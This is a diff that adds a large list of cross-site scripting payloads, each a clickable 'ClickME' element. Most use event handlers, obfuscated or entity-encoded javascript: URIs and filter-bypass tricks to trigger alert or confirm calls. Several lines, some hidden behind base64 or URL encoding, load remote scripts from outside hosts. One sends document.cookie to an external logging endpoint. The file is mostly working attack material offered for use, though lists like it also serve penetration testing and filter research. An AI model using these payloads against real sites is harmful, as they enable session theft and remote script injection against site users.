@@ -1,0 +1,399 @@
+<a href="#" onclick="this.onafterprint=()=>alert('XSS via onafterprint');">ClickME</a>
+<a href="#" onclick="this.onafterscriptexecute=()=>alert('XSS via onafterscriptexecute');">ClickME</a>
+<a href="#" onclick="this.onanimationcancel=()=>alert('XSS via onanimationcancel');">ClickME</a>
+<a href="#" onclick="this.onanimationend=()=>alert('XSS via onanimationend');">ClickME</a>
+<a href="#" onclick="this.onanimationiteration=()=>alert('XSS via onanimationiteration');">ClickME</a>
+<a href="#" onclick="this.onanimationstart=()=>alert('XSS via onanimationstart');">ClickME</a>
+<a href="#" onclick="this.onauxclick=()=>alert('XSS via onauxclick');">ClickME</a>
+<body onclick="this.onpageshow=()=>alert('XSS via onpageshow');">ClickME</body>
+<body onclick="this.onbeforeunload=()=>confirm('XSS via onbeforeunload');">ClickME</body>
+<body onclick="this.onmousemove=()=>alert('XSS via onmousemove');">ClickME</body>
+<body onclick="this.onhashchange=()=>alert('XSS via onhashchange');">ClickME</body>
+<input type="text" onclick="this.onfocus=()=>alert('XSS via onfocus'); this.focus();" placeholder="ClickME">
+<input type="text" onclick="this.onpaste=()=>alert('XSS via onpaste');" placeholder="ClickME">
+<input type="text" onclick="this.oninput=()=>alert('XSS via oninput');" placeholder="ClickME">
+<input type="text" onclick="this.onchange=()=>alert('XSS via onchange');" placeholder="ClickME">
+<div onclick="this.onmouseenter=()=>alert('XSS via onmouseenter');">ClickME</div>
+<div onclick="this.onmouseleave=()=>alert('XSS via onmouseleave');">ClickME</div>
+<div onclick="this.oncontextmenu=()=>alert('XSS via oncontextmenu'); return false;">ClickME</div>
+<div onclick="this.ondblclick=()=>alert('XSS via ondblclick');">ClickME</div>
+<img src="#" onclick="this.onerror=()=>alert('XSS via onerror');" alt="ClickME">
+<a href="https://yogsec.github.io/xss-test/">ClickME</a>
+<button onclick="alert('XSS via onclick');">ClickME</button>
+<button onclick="this.onmouseup=()=>alert('XSS via onmouseup');">ClickME</button>
+<button onclick="this.onmousedown=()=>alert('XSS via onmousedown');">ClickME</button>
+<form onclick="this.onsubmit=()=>alert('XSS via onsubmit');return false;"><input type='text' placeholder='Enter something'><button type='submit'>ClickME</button></form>
+<div onclick="this.onpointerenter=()=>alert('XSS via onpointerenter');">ClickME</div>
+<div onclick="this.onpointerleave=()=>alert('XSS via onpointerleave');">ClickME</div>
+<div onclick="this.onpointermove=()=>alert('XSS via onpointermove');">ClickME</div>
+<div onclick="this.ondragstart=()=>alert('XSS via ondragstart');" draggable="true">ClickME</div>
+<div onclick="this.ondragover=()=>alert('XSS via ondragover');">ClickME</div>
+<div onclick="this.ondrop=()=>alert('XSS via ondrop');">ClickME</div>
+<div onclick="this.onanimationstart=()=>alert('XSS via onanimationstart');">ClickME</div>
+<div onclick="this.onanimationend=()=>alert('XSS via onanimationend');">ClickME</div>
+<div onclick="this.onanimationiteration=()=>alert('XSS via onanimationiteration');">ClickME</div>
+<div onclick="this.ontouchstart=()=>alert('XSS via ontouchstart');">ClickME</div>
+<div onclick="this.ontouchend=()=>alert('XSS via ontouchend');">ClickME</div>
+<div onclick="this.ontransitionstart=()=>alert('XSS via ontransitionstart');">ClickME</div>
+<div onclick="this.ontransitionend=()=>alert('XSS via ontransitionend');">ClickME</div>
+<audio onclick="this.oncanplay=()=>alert('XSS via oncanplay');">ClickME</audio>
+<video onclick="this.onplay=()=>alert('XSS via onplay');">ClickME</video>
+<video onclick="this.onpause=()=>alert('XSS via onpause');">ClickME</video>
+<a href="#" onclick="alert(document.cookie);">ClickME</a>
+<input type="text" onclick="confirm(document.domain);" placeholder="ClickME">
+<a href="#" onmouseover="alert('XSS via onmouseover!')">ClickME</a>
+<a href="#" onpageshow="alert('XSS via onpageshow!')">ClickME</a>
+<div onclick="this.ondrop=()=>alert('XSS via ondrop!');" draggable="true">ClickME</div>
+<a href="#" onclick="this.onload=()=>alert('XSS via onpageload!'); this.click();">ClickME</a>
+<a href="#" onpagehide="alert('XSS via onpagehide!')">ClickME</a>
+<a href="#" onclick="location.reload(); alert('XSS via page refresh!')">ClickME</a>
+<a href="#" onmouseover="try{let funcs=[];for(const k in window){typeof window[k]==='function'&&window[k]();funcs.push(k);}alert('Executed '+funcs.length+' functions!');}catch(e){alert('Error: '+e.message);}">ClickME</a>
+<a href="#" onmouseover="try{let funcs=[];[...document.querySelectorAll('*')].forEach(el=>{for(let k in el){try{if(typeof el[k]==='function'){el[k]();funcs.push(k);}}catch(e){}}});for(let k in window){try{if(typeof window[k]==='function'){window[k]();funcs.push(k);}}catch(e){}}alert('Executed '+funcs.length+' functions!');}catch(e){alert('Error: '+e.message);}">ClickME</a>
+"><form onformdata%3Dwindow.confirm(cookie)><button>ClickME<!--
+javascript​:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>ClickME</button><hvita onbeforetoggle​="+a+b+c+" popover id=x>Hvita</hvita>") 
+a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(document.domain)" />ClickME 
+%3ca%2fhref%3d%22j%0A%0Davascript%3a%7bvar%7b3%3as,2%3ah,5%3aa,0%3av,4%3an,1%3ae%7d%3d'earltv'%7d[self][0][v%2ba%2be%2bs](e%2bs%2bv%2bh%2bn)(document.domain)%22%20%2f%ClickME
+"><div onpointerrawupdate="console.log('XSS')">ClickME</div>
+<a/href=javascript&colon;alert()>ClickME
+<a href="javascript&#0000058&#0000097lert('Successful XSS')">ClickME</a>
+<a href="  &#x8; &#23;   javascript:alert('Successful XSS')">ClickME</a>
+<a href='vbscript:MsgBox("Successful XSS")'>ClickME</a>
+javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>ClickME</button><hvita onbeforetoggle="+a+b+c+" popover id=x>Hvita</hvita>")
+<a/href="javascript:Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">ClickME
+<math><x xlink:href=javascript:confirm`1`>ClickME
+<a/href=&#74;ava%0a%0d%09script&colon;alert()>ClickME
+<d3v/onauxclick=(((confirm)))``>ClickME
+<d3v/onmouseleave=[2].some(confirm)>ClickME
+<alert(1)<! — onclick=location=innerHTML+outerHTML>javascript:1/*ClickME*/</alert(1)<! — →
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>ClickME 
+<a/href=%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x0a;:alert(1)>please%20ClickME</a>
+<details open ontoggle="alert(1)"><summary>ClickME</summary></details>
+tagName%2BinnerHTML%2Blocation.hash%3E/*ClickME#*/alert(document.domain)
+<a href="javascript:alert(1)?xss=true&key=value">ClickME</a>
+<a href=javascript&#58;&#97;&#108;&#101;&#114;&#116;(1)>ClickME</a>
+">ClickME<%5K/onpointerenter​=alert(location)>%3!–
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickME
+<a href=j&#97v&#97script:&#97lert(1)>ClickME</a>
+<a href=javascript:%26%2365%6C%65%72%74%28%31%29>ClickME</a>
+<a href=javascript:\x61\x6c\x65\x72\x74(1)>ClickME</a>
+<a AAAA Href="javAscriPt:ALeRt(1)" aa aaa aaaa>ClickME</a>
+<a href=javascript:\u0061\u006c\u0065\u0072\u0074(1)>ClickME</a>
+<a href="javascript:/*-/*-/*-*/alert(1)//">ClickME</a>
+<a href="jaVasCript:window ">ClickME</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">ClickME</a>
+<a href="jav ascript:al ert(1)">ClickME</a>
+<a href="#" onclick="al&#x65;rt(1)">ClickME</a>
+<a href="javascript:%00alert(1)">ClickME</a>
+<a href="javascript:alert(1)"><ClickME</a>
+<a href="javascript:alert&lpar;1&rpar;">ClickME</a>
+<a href="javascript:alert(1)"><svg/onload=alert(1)>ClickME</a>
+<a href="javascript:eval('window.location=\"javas'+'cript:alert(1)\"')">ClickME</a>
+<form><button formaction=javascript&colon;alert(1)>ClickME
+<x v-on:click='_b.constructor`alert(1)`()'>ClickME</x>
+'<00 foo="<a%20href="javascript:alert('XSS-Bypass')">ClickME</00>--%20/
+<x @click='_b.constructor`alert(1)`()'>ClickME</x>
+%22%3ClickME%3C%5K/onpointerenter=alert(location)%3E%3!
+<x @click=$event.view.alert(1)>ClickME</x>
+<a href=javascript:alert(1)>ClickME
+<math><brute href=javascript:alert(1)>ClickME
+"><a href=jav&#x0D;ascript&colon;top[8680439..toString(30)](document.domain)>ClickME</a>
+javascript:var a="ale";var b="rt";var c="()";decodeURI("&lt;button popovertarget=x&gt;ClickME&lt;/button&gt;&lt;hvita onbeforetoggle="+a+b+c+" popover id=x&gt;Hvita&lt;/hvita&gt;")
+<x onauxclick=a=alert,a(domain)>ClickME
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>ClickME
+<x/onclick=globalThis&lsqb;’\u0070r\u006f’+’mpt’]&lt;)>ClickME
+<a data-orig-ref=" alert(1)" data-orig-proto="javascript" href="javascript:// alert(1)">ClickME</a>
+"><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>ClickME
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>ClickME
+">ClickME<P/onpointerenter="alert(1)"><<"
+ClickME<P/onpointerenter="alert(1)">
+"><block%quote oncontextmenu%3Dconfirm(1)>ClickME/blockquote><!--
+?><a/\test=?%26quot;x%26quot;?href=?%01javascript:/*%b1*/;location.assign(?//hackerone.com/stealthy?x=?+location)?>ClickME
+<x onauxclick=import('//1152848220/')>ClickME
+<x onauxclick=import('//xss/')>ClickME
+<a?/onclick=(confirm)(document.cookie)>ClickME
+<x/onclick=globalThis&lsqb;?\u0070r\u006f?+?mpt?]&lt;)>ClickME
+<lol/onauxclick=[0].some(alert)>ClickME
+ClickME%EF%BC%9Cimg%20src%3Dxxx%20onerror%3Dalert(1)%EF%BC%9E
+<xssBypass/onpointermove=(confirm)(1)>ClickME
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />ClickME
+<a"/onclick=(confirm)()>ClickME
+<d3v/onauxclick=[2].some(confirm)>ClickME
+<x onmouseup=alert(1)>ClickME
+<a href="data:text/html;charset=utf-7;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">ClickME</a> { Data URI XSS: data:text/html;charset=utf-7;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4= (PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=) : <script>alert('XSS')</script> }
+<div onpointerenter="alert(45)">ClickME</div>
+<button formaction="javascript:alert('XSS')">ClickME</button>
+<a href=javas&Tab;cript​:ale&Tab;rt()>ClickME</a>
+<x @click=_withCtx.constructor`alert(1)`()>ClickME</x>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>ClickME</a>
+“-alert(1)<javas onclick=location=tagName%2binnerHTML%2bpreviousSibling.nodeValue>cript:”ClickME
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickME
+<math href="javascript:javascript:alert(1)">ClickME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">ClickME</maction> </math>
+"><button onclick=alert(1)>ClickME</button>
+"><a href="#" onmouseover=alert(1)>ClickME</a>
+"><a href="#" onmousedown=alert(1)>ClickME</a>
+"><textarea onfocus=alert(1)>ClickME</textarea>
+"><div onmouseover="alert(1)">ClickME</div>
+"><a href="#" onhover=alert(1)>ClickME</a>
+"><button ondblclick=alert(1)>ClickME</button>
+"><div onmousedown=alert(1)>ClickME</div>
+"><button onclick="alert(1)">ClickME</button>
+"><a href="#" onclick="alert(1)">ClickME</a>
+"><a href="#" ondblclick=alert(1)>ClickME</a>
+"><button onmouseover="alert(1)">ClickME</button>
+"><button oncontextmenu=alert(1)>ClickME</button>
+"><a href=javascript&#58;alert&#40;1&#41;>ClickME</a>
+"><form><button formaction=javascript:alert(1)>ClickME</button></form>
+"><svg><a href='javas&#99;ript:alert(1)'>ClickME</a></svg>
+"><a href=javascript:alert(1)>ClickME</a>
+"><button onclick='window '>ClickME</button>
+"><a href="#" onclick="eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3NjcmlwdC5zcmMgPSAnaHR0cHM6Ly94c3Mwci5jb20vUmVzb3VyY2VzL3guanMnO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KTs='))">ClickME</a>
+"><button onclick=Function(`alert(1)`)>ClickME</button>
+"><a href=javascript:confirm(1)>ClickME</a>
+"><button onclick=Function('alert(1)')>ClickME</button>
+"><button onclick=window >ClickME</button>
+"><svg/onload=confirton onclick=alert(1)>ClickME</button>
+"><button onclick=alert`1`>ClickME</button>
+"><button onclick="window ">ClickME</bdeo onerror=alert(1)>
+"><input type="button" onclick=window >ClickME</button>
+"><input type="button" onclick="window ">ClickME</input>
+"><button onclick=Function('a','l','e','r','t')(1)>ClickME</button>
+confirm(window.toStaticHTML('<label style="overflow:hidden;background:red;display:block;width:4000px;height:4000px;position:absolute;top:0px;left:0px;" for="submit">ClickME'));
+<math xmlns="http://www.w3.org/1998/Math/MathML" xlink:href="javascript:alert(1);alert(2)">ClickME</math>
+<div onmouseover="alert(1),alert(2),alert(3)">ClickME</div>
+"><svg/onload=alert(1)><iframe/src="javascript:alert(2)"></iframe><math><a xlink:href="javascript:alert(3)">ClickME</a></math><img src="x" onerror="alert(4)"><input type="text" value="'';!--\"<XSS>=&{()}" autofocus onfocus="alert(5)">
+<math href="javascript:javascript:alert(/AmoloHT/)">ClickME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(/AmoloHT/)">ClickME</maction> </math>
+<strong><button popovertarget="x">ClickME</button><test onbeforetoggle="alert(document.domain)" popover id="x">aaa</test></strong>
+'href=javascript:alert()>ClickME<a/y='
+'<00 foo="<a%20href="javascript:alert('XSS-Bypass')">ClickME</00>--%20/
+<button onclick="confirm?.(1)//%5C">ClickME</button>
+<button onclick="'<!--><img src=x onerror=(confirm)(1)>shadowpentesting@gmail.com">ClickME</button>
+<button onclick="'/*\\'/*\"/*\\\"/*</script><input autofocus onfocus=/**/(import('https:\\X55.is?1=18369'))//>">ClickME</button>
+<button onclick="confirm?.(1)">ClickME</button>
+<button onclick="let s = document.createElement('script'); s.src='https://X55.is?1=18369'; document.body.appendChild(s);">ClickME</button>
+<button onclick="document.body.innerHTML += '<svg onload=alert(document.domain)></svg>';">ClickME</button>
+<button onclick="document.body.innerHTML += '<script>alert(0%0)</script>';">ClickME</button>
+<button onmouseover="alert(String.fromCharCode(88,83,83))">ClickME</button>
+<button onmouseover="document.body.innerHTML += '<img src=x onerror=alert(cloudfrontbypass)>';">ClickME</button>
+<button onclick="document.body.innerHTML += '<svg onload=alert(1)></svg>';">ClickME</button>
+<button onclick="document.body.innerHTML += '<img src=x onerror=alert(1)>';">ClickME</button>
+<button onclick="document.body.innerHTML += '<iframe src=\"javascript:alert(document.cookie);\"></iframe>';">ClickME</button>
+<button onclick="alert(document.cookie);">ClickME</button>
+<button onclick="alert(9);">ClickME</button>
+<button onclick="document.body.innerHTML += '<svg onload=prompt(\"Path Injection Reflected XSS\")></svg>';">ClickME</button>
+<button onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'));">ClickME</button>
+<button onmouseover="alert(1);">ClickME</button>
+<button onclick="document.body.innerHTML += '<svg onload=$.globalEval(\"al\"+\"ert()\")></svg>';">ClickME</button>
+<button onclick="alert('XSS via JavaScript Payload!');">ClickME</button>
+<button onclick='document.body.innerHTML += "<img src=\'x\' onload=prompt(1)>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<a href=\'javascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}=\'test\'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)\'>ClickME</a>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<svg onpointerenter=\'location=javas+cript:ale+rt%2+81%2+9;//\'></svg>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<svg onload=$.globalEval(\'al\' + \'ert()\');></svg>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<details open ontoggle=\'self[\'wind\'%2b\'ow\'][\'one\'%2b\'rror\']=self[\'wind\'%2b\'ow\'][\'ale\'%2b\'rt\'];throw/**/self[\'doc\'%2b\'ument\'][\'domain\'];\'></details>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<script>prompt()</script>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<svg onload=alert(\'hex\')></svg>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<script>alert(document.cookie)</script>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<svg onload=prompt()></svg>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<svg onload=alert(1)></svg>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<details open ontoggle=alert(origin)></details>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<iframe src=\'javascript:alert(document.cookie);\'></iframe>"'>ClickME</button>
+<button onclick='alert(123);'>ClickME</button>
+<button onclick='document.body.innerHTML += "\'><script>alert(154)</script>;;<script/154=\'></script>";'>ClickME</button>
+<button onclick='document.body.innerHTML += "\'><script>alert(154)</script><script////154=\'></script>";'>ClickME</button>
+<button onclick='document.body.innerHTML += "&lt;script&gt;alert(1)&lt;/script&gt;"'>ClickME</button>
+<button onclick='document.body.innerHTML += "%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B"'>ClickME</button>
+<button onclick='document.body.innerHTML += "&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"'>ClickME</button>
+<button onclick='document.body.innerHTML += "%26amp%3Blt%3Bscript%26amp%3Bgt%3Balert%281%29%26amp%3Blt%3B%2Fscript%26amp%3Bgt%3B"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<d3v onmouseleave=[2].some(confirm)>ClickME</d3v>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<details open ontoggle=alert()>ClickME</details>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<details open ontoggle=(confirm)()>ClickME</details>"'>ClickME</button>
+<button onclick='[][“\146\151\154\164\145\162”][“\143\157\156\163\164\162\165\143\164\157\162”]("\145\166\141\154\50\141\164\157\142\50\42\131\127\170\154\143\156\121\157\115\123\153\75\42\51\51")();'>ClickME</button>
+<button onclick='var a="al"; var b="ert"; self[a+b]();'>ClickME</button>
+<button onclick='var a="Fun", b="ction", c="ev", d="al(a", e="tob", f="(\'YWxlcnQoMSk=\')"); self[a+b](c+d+e+f)();'>ClickME</button>
+<button onclick='document.body.innerHTML += "<img src=x onError=\`\${x};alert(\`XSS\`);\`>"'>ClickME</button>
+<button onclick='top["al\\x65rt"]("xss");'>ClickME</button>
+<button onclick='document.body.innerHTML += "<svg onload=\'+/\"/+onmouseover=1/+/[*/[]/+alert(1)//\'></svg>"'>ClickME</button>
+<button onclick='javascript:alert();'>ClickME</button>
+<button onclick='document.body.innerHTML += "<p onclick=alert()>//*/alert()/*</p>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<p onclick=alert(123)//>*/alert()/*<img src=x onerror=alert(456)/><svg onload=prompt(789)/>;\"// :;fn();{{12*12+\'Audi RS5\'.substr(0,4)}}XXX<script>alert(\'XSS\')</script>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<iframe onload=alert(1)></iframe>"'>ClickME</button>
+<button onclick='document.body.innerHTML += "<img src=x onerror=\'(function s(){var i=new Image(); i.src=\'http://bl4de.tech/bxss.php?c=\'+document.cookie+\';\'+encodeURIComponent(location.href); document.body.append(i)})()\'/>"'>ClickME</button>
+<button onmouseover="alert(1)">ClickME</button>
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickME</a>
+<a a=1 b=2 c=3 d=4 e=5 f=6 g=7 href="jaVasCrIpt:al&#x65;rt(1)">ClickME</a>
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa href=javascript:\u0061\u006c\u0065\u0072\u0074(1)>ClickME</a>
+<a aa aaa aaaa aaaaa aaaaaa href="jav ascript:al ert(1)" aaaaaaa aaaaaaaa>ClickME</a>
+<a aa aaa aaaa href="javascript:void(0)" onclick="al&#x65;rt(1)">ClickME</a>
+<a a=1 b=2 c=3 d=4 e=5 f=6 href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">ClickME</a>
+<a aaaaa aaaaaa href=j&#97v&#97script:/*-/*-/*-*/alert(1)//>ClickME</a>
+<a a=1 b=2 href=javascript:\x61\x6c\x65\x72\x74(1)>ClickME</a>
+<a aa aaa aaaa aaaaa href="javascript:eval('al'+'ert(1)')">ClickME</a>
+<a aa aaa aaaa aaaaa href="javascript:window ">ClickME</a>
+<a aaaaa aaaaaa aaaaaaa aaaaaaaa href="javAscriPt:al&#x65;rt(1)" aaaaaaaaa aaaaaaaaaa>ClickME</a>
+<a a=1 b=2 href="javascript:%00alert(1)">ClickME</a>
+<a aa aaa href="#" onclick="al&#x65;rt(1)">ClickME</a>
+<a aa aaa aaaa href="javascript:alert&lpar;1&rpar;">ClickME</a>
+<a aa aaa aaaa aaaaa href="#" onclick="setTimeout(() => {alert(1)}, 0)">ClickME</a>
+<a aa aaa aaaa aaaaaa aaaaaaa href="javascript:void(eval('al'+'ert(1)'))">ClickME</a>
+<a bbbbb ccccc ddddd eeeee fffff ggggg hhhhh iiiii jjjjj href=j&#97vas&#99ript:al&#101rt(1)>ClickME</a>
+<div xaa yaa zaa href="java script:alert(1)" onclick="return false;"><span>ClickME</span></div>
+<a data-attr="example" role="link" tab-index="-1" onclick="void(0)" href="javascript:al\u0065rt(1)">ClickME</a>
+<svg onmouseover="al&#101rt(1)" xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">ClickME</text></svg>
+<a style="position:absolute;" onfocus="al&#101rt(1)" href="javascript:void(0)">ClickME</a>
+<button xaaaa yaaaa zaaaaa onclick="javascript:alert(1)">ClickME</button>
+<a aria-hidden="true" draggable="true" hidden href="j&#x61v&#97scrip&#x74:aler&#x74(1)">ClickME</a>
+<form action="javascript:al&#x65;rt(1)" method="post"><button type="submit">ClickME</button></form>
+<div data-href="javasc%72ipt:alert(1)"><a role="button" tabindex="0" onmouseover="location.href=this.parentNode.getAttribute('data-href')">ClickME</a></div>
+<iframe src="javascript:alert(1)"></iframe><a tabindex="-1">ClickME</a>
+<a onmouseenter="al&#x65rt(1)" href="#">ClickME</a>
+<a class="stealth-link" href="data:text/html,<script>alert(1)</script>">ClickME</a>
+<a role="presentation" onmouseover="setTimeout('alert(1)',100)" href="#">ClickME</a>
+<input type="button" value="ClickME" onclick="javascript:al&#x65rt(1)">
+<div data-foo onclick="location='javascript:aler'+'t(1)'">ClickME</div>
+<a hidden="hidden" role="presentation" href="javascript:void(0)" onclick="al%65rt(1)">ClickME</a>
+<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)">ClickME</a></svg>
+<marquee behavior="alternate" onstart="javascript:al&#x65rt(1)">ClickME</marquee>
+<a id="hidden-link" onmousedown="alert(1)">ClickME</a>
+<a style="display: inline-block;" href="javascript:/*-/*-/*-*/alert(1)">ClickME</a>
+<a bbbb cccc dddd eeee ffff gggg href="javasc&#114;ipt:aler&#x74(1)">ClickME</a>
+<div xaaa yaaa zaaa onclick="location='jav&#97script:aler'+'t(1)'">ClickME</div>
+<span role="link" tabindex="0" onclick="window ">ClickME</span>
+<a x-href="javascript:void(0)" onmouseenter="eval('al'+'ert(1)')">ClickME</a>
+<input type="button" value="ClickME" onclick="setTimeout('ale'+'rt(1)',10)">
+<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="j&#97vascript:aler&#116(1)">ClickME</a></svg>
+<div data-attr="javascript:alert(1)" onclick="location.href=this.getAttribute('data-attr')">ClickME</div>
+<marquee behavior="alternate" onstart="javascript:aler&#x74(1)">ClickME</marquee>
+<a href="data:text/html,<script>alert(1)</script>">ClickME</a>
+<button style="display:none;" onclick="alert(1)">Hidden Button</button><span onclick="this.previousSibling.click()">ClickME</span>
+<form action="javascript:al%65rt(1)" method="POST"><button type="submit">ClickME</button></form>
+<a style="cursor:pointer;" onmousedown="al&#101;rt(1)">ClickME</a>
+<span class="invisible" onclick="al&#x65rt(1)" role="button" tabindex="0">ClickME</span>
+<a x-onclick="aler%74(1)" onfocus="eval(this.getAttribute('x-onclick'))" href="#">ClickME</a>
+<svg><foreignObject><a href="javascript:alert(1)">ClickME</a></foreignObject></svg>
+<a data-foo="alert(1)" onclick="window[this.dataset.foo]()">ClickME</a>
+<a style="position:absolute;" onmouseover="al%65rt(1)" href="#">ClickME</a>
+<div style="display:none;"><button onclick="al&#101rt(1)">Trigger</button></div><a href="#" onclick="this.previousElementSibling.firstElementChild.click()">ClickME</a>
+<a role="presentation" style="pointer-events:none;" href="#" onclick="eval('al'+'ert(1)')">ClickME</a>
+<object data="javascript:alert(1)"><a>ClickME</a></object>
+<a id="waf-bypass" href="javascript://%0Aalert(1)">ClickME</a>
+<a xlink:href="javascript:al&#101;rt(1)" xmlns:xlink="http://www.w3.org/1999/xlink">ClickME</a>
+<a bb cc dd href="j&#97vascript:al&#101;rt(1)">ClickME</a>
+<div onmouseover="setTimeout('al'+'ert(1)',10)">ClickME</div>
+<a style="cursor: pointer;" onmousedown="aler&#116(1)">ClickME</a>
+<form action="javascript:alert(1)" method="POST"><button>ClickME</button></form>
+<svg><a xlink:href="j&#97vascript:aler&#x74(1)">ClickME</a></svg>
+<a onclick="eval('al'+'ert(1)')" href="#">ClickME</a>
+<a x-href="javascript:aler%74(1)" onfocus="eval(this.getAttribute('x-href'))">ClickME</a>
+<marquee onstart="alert(1)">ClickME</marquee>
+<a onmouseenter="window ">ClickME</a>
+<div onclick="location='javascript:alert(1)'">ClickME</div>
+<a xlink:href="javascript:aler&#x74(1)" xmlns:xlink="http://www.w3.org/1999/xlink">ClickME</a>
+<a onmouseover="setTimeout('al'+'ert(1)',10)">ClickME</a>
+<button onclick="al&#101;rt(1)">ClickME</button>
+<a style="pointer-events: none;" onclick="alert(1)">ClickME</a>
+<a bb cc href="jav&#97script:al&#101rt(1)">ClickME</a>
+<a href="javascript://%0Aalert(1)">ClickME</a>
+<span onclick="this.previousElementSibling.click()">ClickME</span>
+<a onmousedown="setTimeout('alert(1)',100)">ClickME</a>
+<form action="javascript:alert(1)"><button>ClickME</button></form>
+<a href="javascript:al&#101;rt(1)">ClickME</a>
+<div onclick="eval('ale'+'rt(1)')">ClickME</div>
+<button onclick="eval('al'+'ert(1)')">ClickME</button>
+<a onmouseover="window ">ClickME</a>
+<svg><a xlink:href="javascript:alert(1)">ClickME</a></svg>
+<iframe src="javascript:alert(1)"></iframe>
+<a href="javascript:alert`1`">ClickME</a>
+<button onmousedown="alert(1)">ClickME</button>
+<a href="javascript://aler%74(1)">ClickME</a>
+<span onmouseenter="eval('al'+'ert(1)')">ClickME</span>
+<a onmouseover="alert(1)">ClickME</a>
+<button onclick="setTimeout('alert(1)',50)">ClickME</button>
+<a onmouseenter="alert(1)">ClickME</a>
+<a href="j&#97vascript:alert(1)">ClickME</a>
+<button onclick="eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8veHNzMHIuY29tL2MvaWJybzEzMzcnO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocyk7'));">ClickME</button>
+<button onclick="eval(unescape('%76%61%72%20%73%3D%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%73%63%72%69%70%74%27%29%3B%73%2E%73%72%63%3D%27%68%74%74%70%73%3A%2F%2F%78%73%73%30%72%2E%63%6F%6D%2F%63%2F%69%62%72%6F%31%33%33%37%27%3B%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%73%29%3B'));">ClickME</button>
+<button onclick="eval('var s=document.createElement(\'script\');s.src=\'https://xss0r.com/c/ibro1337\';document.body.appendChild(s);')">ClickME</button>
+<div onclick="window ">ClickME</div>
+<a onfocus="eval('al'+'ert(1)')">ClickME</a>
+<a href="javascript:void(0)" onclick="alert(1)">ClickME</a>
+<button onmousedown="eval('alert(1)')">ClickME</button>
+<a x-href="javascript:alert(1)" onfocus="eval(this.getAttribute('x-href'))">ClickME</a>
+<button onclick="window ">ClickME</button>
+<a href="j&#97vascript:aler&#116(1)">ClickME</a>
+<div onclick="setTimeout('alert(1)',10)">ClickME</div>
+<a onmousedown="eval('alert(1)')">ClickME</a>
+<svg><a href="javascript:alert(1)">ClickME</a></svg>
+<a onclick="setTimeout('alert(1)',50)">ClickME</a>
+<div onclick="eval('aler'+'t(1)')">ClickME</div>
+"><a href='#' onclick="var s=document.createElement('script');s.src='https://xss0r.com/Resources/x.js';document.body.appendChild(s)">ClickME</a>
